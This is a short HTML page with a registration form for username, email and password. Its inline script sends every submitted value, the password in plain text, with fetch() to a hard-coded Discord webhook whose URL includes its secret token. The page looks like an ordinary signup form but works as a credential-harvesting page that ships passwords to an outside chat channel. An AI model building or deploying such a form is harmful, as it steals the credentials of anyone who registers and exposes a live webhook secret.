r<!DOCTYPE html>
<html>
<head>
    <title>Register</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <h2>Registration Form</h2>
    <form onsubmit="sendToDiscord(event)">
        <label for="name">userName:</label><br>
        <input type="text" id="name" name="name" required><br><br>

        <label for="email">Email:</label><br>
        <input type="email" id="email" name="email" required><br><br>

        <label for="password">Password:</label><br>
        <input type="password" id="password" name="password" required><br><br>

        <input type="submit" value="Register">
    </form>

    <script>
    function sendToDiscord(event) {
        event.preventDefault(); // stop page reload

        const name = document.getElementById("name").value;
        const email = document.getElementById("email").value;
        const password = document.getElementById("password").value;

        const webhookURL = "https://discord.com/api/webhooks/1377284518234554421/dDKOBOn-XS2CvtDiAko_MVsv2lsFvGTiyOnJtmwIX58VQNkndG185w0xF37VOApxR1D3";

        const message = {
            content: `üì® **New Registration**\nüë§ Name: ${name}\nüìß Email: ${email}\nüîí Password: ${password}`
        };

        fetch(webhookURL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(message)
        })
        .then(response => {
            if (response.ok) {
                alert("‚úÖ Registered! Check Discord.");
            } else {
                alert("‚ùå Error sending to Discord.");
            }
        });
    }
    </script>
</body>
</html>
